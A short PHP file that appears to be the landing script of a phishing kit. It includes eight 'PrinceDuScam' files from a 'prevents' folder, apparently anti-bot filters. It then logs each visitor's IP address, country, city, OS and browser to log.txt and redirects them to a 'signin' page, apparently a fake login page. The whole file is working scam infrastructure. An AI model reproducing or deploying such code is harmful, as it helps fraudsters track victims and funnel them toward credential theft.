<?php 
include '../prevents/PrinceDuScam1.php';
include '../prevents/PrinceDuScam2.php';
include '../prevents/PrinceDuScam3.php';
include '../prevents/PrinceDuScam4.php';
include '../prevents/PrinceDuScam5.php';
include '../prevents/PrinceDuScam6.php';
include '../prevents/PrinceDuScam7.php';
include '../prevents/PrinceDuScam8.php';
ob_start();
session_start();
require '../extra/algo.php';
$_SESSION['language']=getLanguage();
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['ip_city']=clientData('city');
$_SESSION['ip_state']=clientData('state');
$_SESSION['ip_timezone']=clientData('timezone');
$_SESSION['currency']=clientData('currency');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";$save=fopen("../log.txt","a+");
fwrite($save,$code);fclose($save);
exit(header("Location: signin"));
?>